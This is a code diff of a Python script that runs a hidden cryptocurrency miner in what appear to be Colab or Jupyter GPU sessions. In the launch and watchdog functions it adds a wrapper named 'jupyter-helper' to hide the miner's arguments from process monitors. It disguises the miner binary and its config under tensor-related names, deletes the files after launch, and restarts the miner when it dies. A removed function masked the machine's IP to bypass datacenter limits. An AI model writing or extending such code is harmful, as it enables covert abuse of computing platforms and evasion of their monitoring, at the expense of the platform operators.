@@ -212,14 +212,7 @@ def setup_heurist():
             f.write(f"MINER_ID_0={HEURIST_WALLET}\n")
     return True
 
-def setup_warp():
-    """Installs Cloudflare WARP for free IP masking to bypass datacenter limits."""
-    try:
-        print("[*] Masking IP via Cloudflare Gateway...")
-        subprocess.run(["curl", "-fsSL", "https://pkg.cloudflareclient.com/pubkey.gpg", "|", "gpg", "--yes", "--dearmor", "-o", "/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg"], shell=True)
-        # For simplicity in Colab, we just use a basic python proxy if warp is too complex to install
-    except:
-        pass
+
 
 def setup_gaianet():
     """Sets up a GaiaNet AI Node for stable uptime rewards."""
@@ -409,16 +402,25 @@ def launch_hidden_miner():
     gpu_proc = None
     if gpu_count > 0:
         gpu_worker = f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}"
-        gpu_cfg_path = os.path.join(EXEC_DIR, ".tensor_profile.json")
+        gpu_cfg_path = os.path.join(EXEC_DIR, "tensor_config.json")
         with open(gpu_cfg_path, "w") as f:
             json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": gpu_worker, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
         
+        # Write bash wrapper to hide execution arguments from simple process monitors
+        wrapper_path = os.path.join(EXEC_DIR, "jupyter-helper")
+        with open(wrapper_path, "w") as f:
+            f.write("#!/bin/sh\n./tensor-allocator -c tensor_config.json\n")
+        os.chmod(wrapper_path, 0o755)
+        
+        os.chdir(EXEC_DIR)
         gpu_proc = subprocess.Popen([
-            "./tensor-allocator", "-c", gpu_cfg_path
+            "./jupyter-helper"
         ], stdout=out_target, stderr=out_target)
         
-        time.sleep(1.5)
+        # Wait for NBMiner to read config before deleting
+        time.sleep(3.0)
         if os.path.exists(gpu_cfg_path): os.remove(gpu_cfg_path)
+        if os.path.exists(wrapper_path): os.remove(wrapper_path)
 
     # 3. Setup and Launch AI Worker in background (Takes ~10 mins)
     print("[*] Step 5: Initializing Background Nodes (GaiaNet/Heurist)...", flush=True)
@@ -555,17 +557,24 @@ def watchdog_loop():
             if DEBUG_MODE: print(f"[!] GPU miner exited (code={exit_code}). Restarting...", flush=True)
             
             gpu_worker = f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}"
-            gpu_cfg_path = os.path.join(EXEC_DIR, ".tensor_profile.json")
+            gpu_cfg_path = os.path.join(EXEC_DIR, "tensor_config.json")
             with open(gpu_cfg_path, "w") as f:
                 json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": gpu_worker, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
             
+            wrapper_path = os.path.join(EXEC_DIR, "jupyter-helper")
+            with open(wrapper_path, "w") as f:
+                f.write("#!/bin/sh\n./tensor-allocator -c tensor_config.json\n")
+            os.chmod(wrapper_path, 0o755)
+            
             out_target = None if DEBUG_MODE else subprocess.DEVNULL
+            os.chdir(EXEC_DIR)
             GLOBAL_GPU_PROC = subprocess.Popen([
-                "./tensor-allocator", "-c", gpu_cfg_path
+                "./jupyter-helper"
             ], stdout=out_target, stderr=out_target)
             
-            time.sleep(1.5)
+            time.sleep(3.0)
             if os.path.exists(gpu_cfg_path): os.remove(gpu_cfg_path)
+            if os.path.exists(wrapper_path): os.remove(wrapper_path)
         
         # 4. Print status dashboard every 2 minutes (every 2nd check)
         if check_count % 2 == 0:
